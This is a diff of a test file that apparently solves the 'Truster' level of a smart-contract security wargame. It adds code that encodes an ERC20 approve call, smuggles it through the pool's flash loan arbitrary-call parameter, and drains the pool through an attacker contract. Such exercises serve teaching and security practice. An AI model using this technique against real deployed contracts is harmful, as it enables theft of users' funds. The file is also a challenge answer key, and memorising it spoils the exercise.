@@ -22,7 +22,14 @@ describe('[Challenge] Truster', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        const attackerContract = await (await ethers.getContractFactory("TrusterLenderPoolAttacker")).deploy(pool.address, token.address);
+        const ABI = [
+            "function approve(address spender, uint256 amount)"
+        ];
+        const iface = new ethers.utils.Interface(ABI);
+        const bytes = iface.encodeFunctionData("approve", [attackerContract.address, TOKENS_IN_POOL]);
+        await pool.connect(player).flashLoan(TOKENS_IN_POOL, pool.address, token.address, bytes);
+        await attackerContract.attack2(player.address);
     });
 
     after(async function () {
